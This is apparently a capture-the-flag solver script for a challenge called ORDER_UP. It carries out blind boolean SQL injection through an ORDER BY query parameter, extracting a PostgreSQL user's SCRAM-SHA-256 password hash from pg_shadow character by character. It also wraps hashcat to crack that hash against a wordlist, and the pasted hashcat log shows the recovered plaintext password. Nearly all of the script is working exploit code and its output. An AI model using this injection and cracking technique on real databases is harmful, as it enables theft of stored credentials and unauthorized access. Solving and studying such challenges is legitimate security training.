import os
import re
import requests
import subprocess
import sys
import tempfile

# Note: This chal has per-team instances SO you have to spin up your instance
# and THEN set it here before.
URL = os.getenv('CHAL_URL') or 'https://dyn-svc-order-up-xzt52u0rhv6nh4eo2w0q-okntin33tq-uc.a.run.app/'
URL = URL + '/query'


def crack(mode, hash):
    print('Cracking hash:', hash)

    file = tempfile.NamedTemporaryFile(delete = False)
    file.write(hash.encode())
    file.close()

    cmd = f'hashcat -O --potfile-disable -m {mode} -a 0 {file.name} /Users/sambrow/hack/misc/rockyou_lowascii.txt'

    output = subprocess.check_output(cmd, shell = True, text = True)
    print(output)

    if hash not in output:
        print(f'Failed to crack hash ({hash}):', output)
        sys.exit(1)

    hashIndex = output.index(hash + ':')

    keyStart = output[hashIndex:]

    colonIndex = keyStart.index(':')
    newlineIndex = keyStart.index('\n')
    secret = keyStart[colonIndex+1:newlineIndex]
    # print('secret:', secret)

    return secret


def tryUrl(expression):
    order = f"CASE WHEN ({expression}) THEN item_name ELSE ''||query_to_xml('bad-query',true,true,'') END"
    params = {'col1': 'item_name', 'order': order}

    response = requests.get(URL, params=params, timeout=20)
    # print(response.status_code, response.text)

    return 'Error' not in response.text




def probeValueAtOffset(value, charOffset):

    lowGuessIndex = 1
    highGuessIndex = 126

    while lowGuessIndex < highGuessIndex:
        guessIndex = lowGuessIndex + (highGuessIndex - lowGuessIndex) // 2;

        expression = f"ascii(substring({value}, {charOffset}, 1)) >= {guessIndex}"
        # print(expression)

        if tryUrl(expression):
            if lowGuessIndex == guessIndex:
                return chr(guessIndex)
            lowGuessIndex = guessIndex
        else:
            highGuessIndex = guessIndex

    return False


def runQuery(expression):
    value = ''
    offset = len(value)
    while True:
        offset += 1
        nextChar = probeValueAtOffset(expression, offset)
        if not nextChar:
            return value
        value += nextChar
        print(value)

    return value

expression = """replace(replace(replace(''||query_to_xml('SE'||'LECT passwd FROM pg_shadow where usename=''flag''',true,true,''),'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"',''),'row',''),'passwd','')"""
value = runQuery(expression)

match = re.search('>(SCRAM-SHA-[^<]+)<', value)
if not match:
    print('FAILED to find flag3')
    sys.exit(1)

scramHash = match.group(1)
print('SOLVED: ORDER_UP flag3 (modulo hashcat work):', scramHash)

# This can take 20+ mins so let's skip it in this solver.
# flag = crack(28600, scramHash)
# print('Cracked flag:', flag)

# store passwd value in a file called passwd.txt
# then crack it using hashcat
# hashcat -m 28600 -a 0 passwd.txt ~/hack/misc/rockyou_lowascii.txt

"""
SCRAM-SHA-256$4096:MQhphEXnE9KbWPtUNblKwA==$Q93WD79YF0CLZqlcxq4fKPEHKC1nHfsiHM/0uWgg7ZY=:WrLZi8JgPow0PHtn+WEa2hp4TkEW33GMOUtAgby4flI=:green134iluryan

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 28600 (PostgreSQL SCRAM-SHA-256)
Hash.Target......: SCRAM-SHA-256$4096:MQhphEXnE9KbWPtUNblKwA==$Q93WD79...y4flI=
Time.Started.....: Tue Dec 26 21:21:04 2023 (13 mins, 50 secs)
Time.Estimated...: Tue Dec 26 21:34:54 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/Users/sambrow/hack/misc/rockyou_lowascii.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#3.........:     9398 H/s (13.68ms) @ Accel:32 Loops:1024 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7776256/14329843 (54.27%)
Rejected.........: 0/7776256 (0.00%)
Restore.Point....: 7775744/14329843 (54.26%)
Restore.Sub.#3...: Salt:0 Amplifier:0-1 Iteration:3072-4095
Candidate.Engine.: Device Generator
Candidates.#3....: green3day -> green out
Hardware.Mon.SMC.: Fan0: 100%, Fan1: 100%
Hardware.Mon.#3..: Temp: 79c

Started: Tue Dec 26 21:20:57 2023
Stopped: Tue Dec 26 21:34:56 2023
"""

